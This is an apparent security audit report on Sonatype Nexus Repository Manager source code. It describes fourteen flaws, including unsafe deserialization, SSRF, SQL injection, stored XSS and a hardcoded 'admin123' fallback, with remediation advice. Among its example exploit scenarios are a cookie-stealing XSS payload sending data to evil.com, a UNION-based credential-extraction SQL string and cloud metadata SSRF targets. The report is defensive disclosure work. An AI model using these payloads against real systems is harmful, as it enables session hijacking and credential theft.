# Sonatype Nexus Repository Manager - Security Audit Report

**Date:** 2026-03-27
**Auditor Role:** Senior Product Security Engineer / Bug Bounty Researcher
**Scope:** Source code review of [sonatype/nexus-public](https://github.com/sonatype/nexus-public) (main branch)
**Methodology:** Static analysis of Java backend (4,406 files), MyBatis XML mappers, React/JSX frontend, configuration files

---

## Executive Summary

This audit identified **14 real, exploitable security vulnerabilities** across the Nexus Repository Manager codebase. The most critical findings include unsafe Java deserialization that can lead to Remote Code Execution (RCE), Server-Side Request Forgery (SSRF) with full TLS bypass, SQL injection via MyBatis string interpolation, and multiple Stored Cross-Site Scripting (XSS) vectors. Several authentication/authorization gaps and cryptographic weaknesses were also identified.

| Severity | Count |
|----------|-------|
| Critical | 3     |
| High     | 4     |
| Medium   | 4     |
| Low      | 3     |

---

## CRITICAL Findings

### VULN-01: Unsafe Java Deserialization in Quartz Job Data (RCE)

**Severity:** CRITICAL
**CVSS 3.1:** 9.8 (if DB compromise) / 8.1 (with chain)
**CWE:** CWE-502 (Deserialization of Untrusted Data)

**Affected Files:**
- `public/common/components/nexus-quartz/src/main/java/org/sonatype/nexus/quartz/internal/bulkread/QuartzObjectBuilder.java` (lines 77-91)
- `public/common/components/nexus-quartz/src/main/java/org/sonatype/nexus/quartz/internal/datastore/QuartzJobDataTypeHandler.java` (lines 45-56)

**Description:**
Both classes deserialize Quartz `JobDataMap` from raw byte arrays stored in the database using a plain `ObjectInputStream` with **no** `ObjectInputFilter`, **no** class allowlist, and **no** type restriction. The `instanceof` check in `QuartzObjectBuilder` executes **after** `readObject()`, meaning malicious gadget chains execute during deserialization before any type validation occurs.

**Vulnerable Code (QuartzObjectBuilder.java:77-91):**
```java
private static JobDataMap deserializeJobData(final byte[] data) throws IOException, ClassNotFoundException {
    try (ByteArrayInputStream bis = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bis)) {
      Object jobData = ois.readObject();  // Gadget chains execute HERE
      if (jobData instanceof JobDataMap jobDataMap) {
        return jobDataMap;  // Type check is too late
      }
      // ...
    }
}
```

**Exploit Scenario:**
1. Attacker gains write access to the Quartz `QRTZ_JOB_DETAILS` or `QRTZ_TRIGGERS` tables (via SQL injection [VULN-04], backup restore, database compromise, or insider access)
2. Attacker crafts a serialized Java object containing a gadget chain (e.g., Commons Collections, Spring, or other libraries on Nexus classpath)
3. Writes the malicious payload to the `JOB_DATA` BLOB column
4. When the Quartz scheduler loads the job, `readObject()` triggers the gadget chain
5. **Result: Remote Code Execution on the Nexus server**

**Recommendation:**
- Implement `ObjectInputFilter` (JEP 290) to restrict deserialized classes to `JobDataMap`, `HashMap`, `String`, and primitive wrappers only
- Consider migrating to JSON serialization for job data storage

---

### VULN-02: Unsafe Java Deserialization in MyBatis Type Handler (RCE)

**Severity:** CRITICAL
**CVSS 3.1:** 8.1
**CWE:** CWE-502

**Affected Files:**
- `public/common/components/nexus-datastore-mybatis/src/main/java/org/sonatype/nexus/datastore/mybatis/AbstractSerializableTypeHandler.java` (lines 108-122)
- `public/common/components/nexus-common/src/main/java/org/sonatype/nexus/common/io/ObjectInputStreamWithClassLoader.java`

**Description:**
The `AbstractSerializableTypeHandler` decrypts stored bytes and then performs full Java deserialization via `ObjectInputStreamWithClassLoader`. The custom `ObjectInputStream` subclass overrides `resolveClass` to use application classloaders but implements **no** class filtering or allowlisting. Any class visible to the application classloaders can be instantiated.

**Vulnerable Code (AbstractSerializableTypeHandler.java:108-122):**
```java
private T deserialize(final byte[] bytes) throws SQLException {
    byte[] decrypted = cipher().decrypt(bytes);
    try (ByteArrayInputStream buf = new ByteArrayInputStream(decrypted);
        ObjectInputStream in = new ObjectInputStreamWithClassLoader(buf, classLoading)) {
      return (T) in.readObject();  // No class filtering
    }
}
```

**Exploit Scenario:**
Requires knowledge of the encryption key/scheme (which may be extractable from configuration) plus write access to encrypted BLOB columns. A compromised database, malicious backup, or migration import containing crafted encrypted payloads leads to RCE on deserialization.

**Recommendation:**
- Add `ObjectInputFilter` to `ObjectInputStreamWithClassLoader` restricting to expected types
- Implement integrity verification (HMAC) on encrypted blobs before decryption

---

### VULN-03: SSRF with Complete TLS Verification Bypass in Certificate Retriever

**Severity:** CRITICAL
**CVSS 3.1:** 9.1
**CWE:** CWE-918 (SSRF), CWE-295 (Improper Certificate Validation)

**Affected Files:**
- `public/common/components/nexus-ssl/src/main/java/org/sonatype/nexus/ssl/CertificateRetriever.java` (lines 75-109, 171-182)
- `public/common/components/nexus-ssl-plugin/src/main/java/com/sonatype/nexus/ssl/plugin/internal/ui/CertificateComponent.java` (lines 75-102)

**Description:**
The `CertificateRetriever` class creates an `SSLContext` initialized with an `ACCEPT_ALL_TRUST_MANAGER` that trusts **any** certificate and uses `NoopHostnameVerifier` that skips hostname verification. The `CertificateComponent.retrieveFromHost()` endpoint accepts user-supplied `host` and `port` parameters, validated only as syntactically valid hostnames/IPs — with **no** blocklist for private/internal networks, cloud metadata IPs, or loopback addresses.

**Vulnerable Code (CertificateRetriever.java:75-109):**
```java
private static final TrustManager ACCEPT_ALL_TRUST_MANAGER = new X509TrustManager() {
    public void checkServerTrusted(final X509Certificate[] certs, final String authType) {
        // all trusted
    }
    // ...
};

SSLContext sc = SSLContext.getInstance("TLS");
sc.init(trustStore.getKeyManagers(), new TrustManager[]{ACCEPT_ALL_TRUST_MANAGER}, null);
SSLConnectionSocketFactory sslSocketFactory = new SSLConnectionSocketFactory(sc, NoopHostnameVerifier.INSTANCE);
```

**Exploit Scenario:**
1. Authenticated user with `nexus:ssl-truststore:read` permission calls the certificate retrieval endpoint
2. Supplies `host=169.254.169.254` (AWS/GCP metadata) or `host=10.0.0.1` (internal service)
3. Nexus server makes an outbound TLS/TCP connection to the specified host with **no certificate validation**
4. Attacker can: scan internal networks, access cloud instance metadata (credentials, tokens), reach internal services behind firewalls, perform active MITM against the connection

**Recommendation:**
- Implement SSRF protection (blocklist for RFC1918, loopback, link-local, metadata IPs) in `CertificateRetriever`
- The trust-all behavior is inherent to the certificate-fetching use case, but network-level restrictions must be enforced
- Add rate limiting to prevent port scanning

---

## HIGH Findings

### VULN-04: SQL Injection via MyBatis String Interpolation (${repositoryName})

**Severity:** HIGH
**CVSS 3.1:** 8.6
**CWE:** CWE-89 (SQL Injection)

**Affected File:**
- `public/common/components/nexus-repository-content/src/main/resources/org/sonatype/nexus/repository/content/store/ContentRepositoryDAO.xml` (line 82)

**Description:**
The `readContentRepositoryId` query uses MyBatis `${repositoryName}` string interpolation (direct concatenation) instead of `#{repositoryName}` (parameterized binding). The value is embedded inside single quotes in a PostgreSQL-specific query, creating a classic SQL injection vector.

**Vulnerable SQL (ContentRepositoryDAO.xml:79-83):**
```xml
<select id="readContentRepositoryId" resultType="java.util.HashMap" databaseId="PostgreSQL">
    SELECT r.name, cr.repository_id FROM repository r
    INNER JOIN ${repositoryFormat}_content_repository cr ON r.id = cr.config_repository_id
    WHERE r.name = '${repositoryName}'
</select>
```

**Data Flow:**
`RepositoryNameIdMappingCache.fetchRepositoryId()` → `ContentRepositoryStore.readContentRepositoryId(format, name)` → SQL execution with unparameterized `repositoryName`.

**Current Mitigation:**
Repository names are validated against `NamePatternConstants.REGEX` (`^[a-zA-Z0-9\\-]{1}[a-zA-Z0-9_\\-\\.]*$`) at creation time, which excludes single quotes. However, this is **defense-in-depth failure**: if any code path creates a repository name without this validation (admin API, database migration, import, or future code changes), full SQL injection is possible.

**Exploit Scenario:**
A crafted repository name like `foo' UNION SELECT username, password FROM security_user --` would extract all user credentials from the database if the name validation is ever bypassed.

**Recommendation:**
- Replace `'${repositoryName}'` with `#{repositoryName}` to use parameterized queries
- Audit all `${...}` usage in MyBatis XML for similar patterns (also present in `SearchTableDAO.xml` for `${filter}`, `${sortColumnName}`)

---

### VULN-05: SSRF via HTTP Redirect Following (Proxy Repository Bypass)

**Severity:** HIGH
**CVSS 3.1:** 7.5
**CWE:** CWE-918 (SSRF)

**Affected Files:**
- `public/common/components/nexus-repository-services/src/main/java/org/sonatype/nexus/repository/proxy/ProxyFacetSupport.java` (lines 611-626, 917-931)
- `public/common/components/nexus-httpclient/src/main/java/org/sonatype/nexus/httpclient/internal/NexusRedirectStrategy.java` (lines 72-128)

**Description:**
When Nexus proxies content from remote repositories, `validateNotPrivateNetwork()` checks the **initial** URI only. The `NexusRedirectStrategy` then follows HTTP redirects (301, 302, 307) **without** re-validating redirect targets against the SSRF blocklist. A redirect `Location` header pointing to internal/private networks bypasses all anti-SSRF controls.

**Vulnerable Pattern (ProxyFacetSupport.java:611-633):**
```java
protected Content fetch(final String url, final Context context, @Nullable final Content stale) throws IOException {
    URI uri = config.remoteUrl.resolve(encodeUrl(url));
    validateNotPrivateNetwork(uri);  // Only checked ONCE for initial URI
    HttpRequestBase request = buildFetchHttpRequest(uri, context, stale);
    HttpResponse response = execute(context, client, request);  // Follows redirects without SSRF check
}
```

**Exploit Scenario:**
1. Attacker controls (or compromises) a remote repository URL configured in Nexus
2. Remote server returns `302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Nexus follows the redirect to the internal metadata service
4. Response data is returned to the attacker as repository content

**Recommendation:**
- Apply `validateNotPrivateNetwork()` to redirect targets in `NexusRedirectStrategy.isRedirected()` or via an `HttpRequestInterceptor`
- Consider disabling automatic redirect following for proxy repositories and handling redirects explicitly

---

### VULN-06: Webhook SSRF (No Internal Network Blocklist)

**Severity:** HIGH
**CVSS 3.1:** 7.2
**CWE:** CWE-918 (SSRF)

**Affected Files:**
- `public/common/components/nexus-core/src/main/java/org/sonatype/nexus/internal/webhooks/WebhookServiceImpl.java` (lines 184-218)
- `public/common/components/nexus-repository-services/src/main/java/org/sonatype/nexus/repository/webhooks/RepositoryWebhookCapabilityConfiguration.java` (lines 46-48)
- `public/common/components/nexus-validation/src/main/java/org/sonatype/nexus/validation/constraint/UrlValidator.java` (lines 33-57)

**Description:**
Webhook URLs are validated only for syntactic correctness (`http/https` scheme, valid hostname pattern). There is **no** blocklist for private networks, loopback, link-local, or cloud metadata addresses. An administrator (or attacker with capability-edit permission) can configure webhooks to POST JSON payloads to arbitrary internal endpoints.

**Vulnerable Code (WebhookServiceImpl.java:189-203):**
```java
HttpPost httpPost = new HttpPost(request.getUrl());  // Any URL
httpPost.setEntity(new StringEntity(json, ContentType.APPLICATION_JSON));
try (CloseableHttpClient httpClient = httpClientProvider.get();
    CloseableHttpResponse putResponse = httpClient.execute(httpPost)) { // No SSRF protection
```

**Exploit Scenario:**
1. User with capability-edit permission sets webhook URL to `http://169.254.169.254/latest/meta-data/`
2. On every repository event, Nexus POSTs data to the cloud metadata endpoint
3. While the response isn't directly returned, timing and error differences can leak information
4. Alternatively, target internal admin panels, Kubernetes APIs, or other backend services

**Recommendation:**
- Apply `AntiSsrfHelper.validateHost()` to webhook URLs before making HTTP requests
- Block RFC1918, loopback, link-local, and metadata IPs at the `WebhookServiceImpl` level

---

### VULN-07: Hardcoded Default Admin Password ("admin123") with Fallback

**Severity:** HIGH
**CVSS 3.1:** 9.8 (when triggered)
**CWE:** CWE-798 (Use of Hard-Coded Credentials)

**Affected File:**
- `public/selfhosted/components/nexus-self-hosted/src/main/java/org/sonatype/nexus/security/config/AdminPasswordSourceImpl.java` (lines 33-60)

**Description:**
The admin password initialization logic contains a hardcoded `DEFAULT_PASSWORD = "admin123"` that is used in two scenarios: (1) when `randomPassword` is explicitly set to `false`, and (2) as a **fallback when writing the random password file fails**. This means even when random passwords are enabled, a filesystem error silently degrades security to a well-known credential.

**Vulnerable Code (AdminPasswordSourceImpl.java:33-60):**
```java
public static final String DEFAULT_PASSWORD = "admin123";

if (!Strings2.isBlank(savedPassword)) {
    return savedPassword;
} else if (!randomPassword) {
    return DEFAULT_PASSWORD;  // Explicitly disabled random password
}

savedPassword = UUID.randomUUID().toString();

if (!adminPasswordFileManager.writeFile(savedPassword)) {
    savedPassword = DEFAULT_PASSWORD;  // File write failure → silent fallback to known password
}
```

**Exploit Scenario:**
1. Fresh Nexus installation in a containerized environment where the password file path is read-only
2. `writeFile()` fails silently, admin password is set to `admin123`
3. Attacker accesses the instance with `admin:admin123`, gaining full administrative control
4. Even when random password is configured, the system degrades to a known credential on failure

**Recommendation:**
- **Fail loudly** when password file write fails instead of falling back to a known credential
- Remove the hardcoded `DEFAULT_PASSWORD` constant entirely
- Log a security warning when the fallback is triggered

---

## MEDIUM Findings

### VULN-08: Stored XSS via Health Check Metric Messages (dangerouslySetInnerHTML)

**Severity:** MEDIUM
**CVSS 3.1:** 6.1
**CWE:** CWE-79 (Cross-Site Scripting)

**Affected Files:**
- `public/common/components/nexus-coreui-plugin/src/frontend/src/components/pages/admin/MetricHealth/MetricHealthList.jsx` (lines 118-124)
- `public/common/components/nexus-coreui-plugin/src/frontend/src/components/pages/admin/MetricHealth/MetricHealthDetails.jsx` (lines 120-124)

**Description:**
Health check metric messages from the server API (`GET /service/rest/internal/ui/status-check`) are rendered using React's `dangerouslySetInnerHTML` without any sanitization. If a health check plugin, custom component, or data corruption causes a message to contain HTML/JavaScript, it will execute in the browser of any user viewing the System Status page.

**Vulnerable Code (MetricHealthDetails.jsx:120-124):**
```jsx
<NxTable.Cell>
    <span dangerouslySetInnerHTML={{__html: metric.message}} />
</NxTable.Cell>
```

**Exploit Scenario:**
1. A malicious or compromised health check extension registers a check with a crafted message containing `<img src=x onerror="document.location='https://evil.com/steal?c='+document.cookie">`
2. Any admin viewing System Status → Health Check has their session token stolen
3. Attacker uses the stolen session to perform admin operations

**Recommendation:**
- Replace `dangerouslySetInnerHTML` with plain text rendering or use a sanitization library (DOMPurify)
- Apply this fix across all 16+ instances of `dangerouslySetInnerHTML` in the frontend

---

### VULN-09: Stored XSS via Branding HTML Injection

**Severity:** MEDIUM
**CVSS 3.1:** 6.5
**CWE:** CWE-79

**Affected File:**
- `public/common/components/nexus-coreui-plugin/src/frontend/src/App.jsx` (lines 57-61, 77-81)

**Description:**
The application renders `branding.headerHtml` and `branding.footerHtml` using `dangerouslySetInnerHTML` on every page load. If an admin (or attacker who compromises an admin account) sets malicious HTML in the branding configuration, it executes for **all users** on **every page**.

**Vulnerable Code (App.jsx:57-61):**
```jsx
{headerEnabled && (
    <div className="nxrm-branding-header" dangerouslySetInnerHTML={{ __html: headerHtml }} />
)}
```

**Exploit Scenario:**
1. Attacker compromises an admin account or exploits admin CSRF
2. Sets branding header HTML to `<script>/* keylogger or credential harvester */</script>`
3. Every user (including other admins) who loads any Nexus page executes the malicious script
4. Enables persistent backdoor access and credential theft

**Recommendation:**
- Sanitize branding HTML server-side and client-side before rendering
- Implement CSP (Content Security Policy) headers to mitigate script injection

---

### VULN-10: Stored XSS via Repository Names in Routing Rules

**Severity:** MEDIUM
**CVSS 3.1:** 5.4
**CWE:** CWE-79

**Affected Files:**
- `public/common/components/nexus-coreui-plugin/src/frontend/src/constants/pages/admin/repository/RoutingRulesStrings.jsx` (lines 77-81)
- `public/common/components/nexus-coreui-plugin/src/frontend/src/components/pages/admin/RoutingRules/RoutingRulesForm.jsx` (lines 120-121)

**Description:**
Repository names are interpolated into HTML anchor tags without HTML entity encoding, then rendered via `dangerouslySetInnerHTML`. While `encodeURIComponent` is applied to the `href`, the visible link **text** uses the raw `name` value.

**Vulnerable Code (RoutingRulesStrings.jsx:77-81):**
```javascript
USED_BY: (repositoryNames) => {
    const repositoryLinks = repositoryNames.map(name =>
        `<a href="#admin/repository/repositories:${window.encodeURIComponent(name)}">${name}</a>`);
    //                                                                              ^^^^^^ raw, unescaped
}
```

**Current Mitigation:**
`NamePatternConstants.REGEX` restricts repository names to `^[a-zA-Z0-9\\-]{1}[a-zA-Z0-9_\\-\\.]*$`, which excludes `<`, `>`, `"`, and `'`. However, this is **validation-only defense** — if name validation is bypassed (API, import, migration), XSS is immediately exploitable.

**Recommendation:**
- HTML-encode all dynamic values before inserting into HTML strings
- Use React's native JSX rendering instead of `dangerouslySetInnerHTML`

---

### VULN-11: Authentication Endpoint Missing Shiro Annotations (Potential Auth Bypass)

**Severity:** MEDIUM
**CVSS 3.1:** 5.3
**CWE:** CWE-862 (Missing Authorization)

**Affected File:**
- `public/common/components/nexus-coreui-plugin/src/main/java/org/sonatype/nexus/coreui/internal/wonderland/AuthenticateResource.java` (lines 62-108)

**Description:**
The `/wonderland/authenticate` endpoint has an explicit `FIXME` comment noting that authentication annotations may be missing. The method performs its own principal matching, but with an empty principal (anonymous subject), `principalName` becomes `""` — meaning a request with an empty username could potentially match and proceed to auth ticket creation.

**Vulnerable Code (AuthenticateResource.java:62-88):**
```java
// FIXME: This may be missing annotation to require user or authentication annotations?

@POST
public AuthTicketXO post(final AuthTokenXO token) {
    final Subject subject = SecurityUtils.getSubject();
    final Object principal = subject.getPrincipal();
    final String principalName = principal == null ? "" : principal.toString();
    // If anonymous, principalName is "" — a request with empty username could match
    if (!principalName.equals(username)) {
        throw new WebApplicationException("Username mismatch", Status.BAD_REQUEST);
    }
    // ... proceeds to create auth ticket
}
```

**Recommendation:**
- Add `@RequiresAuthentication` annotation to the class or method
- Validate that `principal` is not null/empty before proceeding

---

## LOW Findings

### VULN-12: Legacy Password Hashing (MD5/SHA-1, Single Iteration, No Salt)

**Severity:** LOW (with upgrade path)
**CWE:** CWE-916 (Use of Password Hash With Insufficient Computational Effort)

**Affected File:**
- `public/common/components/security/nexus-security/src/main/java/org/sonatype/nexus/security/internal/LegacyNexusPasswordService.java` (lines 39-56)

**Description:**
Legacy password verification supports MD5 and SHA-1 hashes with 1 iteration and no salt. While newer passwords are upgraded to PBKDF2-SHA256, any accounts that haven't logged in since the upgrade retain legacy hashes. A database breach exposes these passwords to trivial offline cracking (rainbow tables, GPU brute force).

**Recommendation:**
- Force password rotation for accounts with legacy hash formats
- Add monitoring/alerting for accounts still using legacy hashes

---

### VULN-13: Weak Default Keystore Signature Algorithm (SHA1withRSA)

**Severity:** LOW
**CWE:** CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)

**Affected File:**
- `public/common/components/nexus-ssl/src/main/java/org/sonatype/nexus/ssl/KeyStoreManagerConfigurationSupport.java` (line 42)

**Description:**
The default signature algorithm for keystore operations is `SHA1WITHRSA`. SHA-1 is deprecated for certificate signatures and considered weak against collision attacks.

**Recommendation:**
- Change default to `SHA256withRSA` or stronger

---

### VULN-14: Response Header Forwarding (Potential Header Injection)

**Severity:** LOW
**CWE:** CWE-113 (HTTP Response Splitting)

**Affected File:**
- `public/common/components/nexus-repository-httpbridge/src/main/java/org/sonatype/nexus/repository/httpbridge/internal/DefaultHttpResponseSender.java` (lines 59-60)

**Description:**
The HTTP bridge forwards response headers from internal `Response` objects to the servlet response without CRLF validation. If upstream content (from proxied repositories) contains headers with CRLF sequences, behavior depends on the Jetty container's header validation.

**Vulnerable Code:**
```java
response.getHeaders().forEach(header -> httpResponse.addHeader(header.getKey(), header.getValue()));
```

**Recommendation:**
- Validate header values for CRLF characters before forwarding

---

## Additional Architectural Concerns

### Script API — Full JVM Access via Spring Container Binding

**Files:**
- `nexus-script/src/main/java/org/sonatype/nexus/internal/script/ScriptServiceImpl.java` (lines 91-103)
- `nexus-base/src/main/java/org/sonatype/nexus/internal/app/GlobalComponentLookupHelperImpl.java` (lines 40-62)

Groovy scripts executed via the Script REST API receive a `container` binding that provides `GlobalComponentLookupHelper`, enabling arbitrary Spring bean lookup by class name. This is **by design** but dramatically amplifies the impact of any script execution vulnerability — it effectively grants full JVM access to anyone who can run scripts.

### JEXL Selector Sandbox Bypass Surface

**File:** `nexus-selector/src/main/java/org/sonatype/nexus/selector/internal/SandboxJexlUberspect.java`

The JEXL sandbox blocks constructors and property setters, and allows only specific methods on String, Map, and Collection. While well-implemented, the `jexl` selector type accepts general JEXL expressions with a wider attack surface than the restricted `csel` type. Future JEXL library vulnerabilities could impact the sandbox.

---

## Summary of Findings

| ID | Severity | Vulnerability | Component |
|----|----------|---------------|-----------|
| VULN-01 | **CRITICAL** | Unsafe Deserialization → RCE (Quartz) | nexus-quartz |
| VULN-02 | **CRITICAL** | Unsafe Deserialization → RCE (MyBatis TypeHandler) | nexus-datastore-mybatis |
| VULN-03 | **CRITICAL** | SSRF + TLS Trust Bypass (Certificate Retrieval) | nexus-ssl |
| VULN-04 | **HIGH** | SQL Injection via MyBatis `${repositoryName}` | nexus-repository-content |
| VULN-05 | **HIGH** | SSRF via HTTP Redirect Following (Proxy) | nexus-repository-services |
| VULN-06 | **HIGH** | Webhook SSRF (No Internal Network Blocklist) | nexus-core |
| VULN-07 | **HIGH** | Hardcoded Default Admin Password Fallback | nexus-self-hosted |
| VULN-08 | **MEDIUM** | Stored XSS via Health Check Messages | nexus-coreui-plugin |
| VULN-09 | **MEDIUM** | Stored XSS via Branding HTML Injection | nexus-coreui-plugin |
| VULN-10 | **MEDIUM** | Stored XSS via Repository Names in Routing Rules | nexus-coreui-plugin |
| VULN-11 | **MEDIUM** | Missing Auth Annotations on /wonderland/authenticate | nexus-coreui-plugin |
| VULN-12 | **LOW** | Legacy MD5/SHA-1 Password Hashing | nexus-security |
| VULN-13 | **LOW** | Weak Default Keystore Signature (SHA1withRSA) | nexus-ssl |
| VULN-14 | **LOW** | Response Header Forwarding (CRLF) | nexus-repository-httpbridge |

---

## Remediation Priority

1. **Immediate (Critical):** VULN-01, VULN-02 — Add `ObjectInputFilter` to all deserialization paths
2. **Immediate (Critical):** VULN-03 — Add SSRF network-level restrictions to certificate retrieval
3. **High Priority:** VULN-04 — Replace `${repositoryName}` with `#{repositoryName}` in MyBatis
4. **High Priority:** VULN-05, VULN-06 — Apply anti-SSRF validation to redirect targets and webhook URLs
5. **High Priority:** VULN-07 — Remove hardcoded password fallback, fail loudly on write errors
6. **Medium Priority:** VULN-08, VULN-09, VULN-10 — Sanitize all `dangerouslySetInnerHTML` usage
7. **Medium Priority:** VULN-11 — Add proper Shiro annotations
8. **Low Priority:** VULN-12, VULN-13, VULN-14 — Update algorithms and add header validation

---

*This report was generated through static source code analysis. Dynamic testing against a running instance is recommended to confirm exploitability of each finding.*
